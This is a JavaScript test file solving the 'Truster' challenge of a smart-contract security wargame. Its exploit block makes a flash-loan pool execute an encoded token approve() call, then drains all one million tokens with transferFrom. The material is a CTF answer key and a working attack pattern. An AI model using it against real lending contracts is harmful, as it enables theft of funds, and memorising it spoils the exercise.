const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
	let deployer, attacker;

	const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, attacker] = await ethers.getSigners();

		const DamnValuableToken = await ethers.getContractFactory(
			"DamnValuableToken",
			deployer
		);
		const TrusterLenderPool = await ethers.getContractFactory(
			"TrusterLenderPool",
			deployer
		);

		this.token = await DamnValuableToken.deploy();
		this.pool = await TrusterLenderPool.deploy(this.token.address);

		await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

		expect(await this.token.balanceOf(this.pool.address)).to.equal(
			TOKENS_IN_POOL
		);

		expect(await this.token.balanceOf(attacker.address)).to.equal("0");
	});

	it("Exploit", async function () {
		/** CODE YOUR EXPLOIT HERE  */
		let ABI = ["function approve(address spender, uint256 amount)"];
		let iface = new ethers.utils.Interface(ABI);
		const payload = iface.encodeFunctionData("approve", [
			attacker.address,
			TOKENS_IN_POOL,
		]);
		await this.pool
			.connect(attacker)
			.flashLoan(0, attacker.address, this.token.address, payload);
		const allowance = await this.token.allowance(
			this.pool.address,
			attacker.address
		);
		await this.token
			.connect(attacker)
			.transferFrom(this.pool.address, attacker.address, allowance);
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker has taken all tokens from the pool
		expect(await this.token.balanceOf(attacker.address)).to.equal(
			TOKENS_IN_POOL
		);
		expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
	});
});
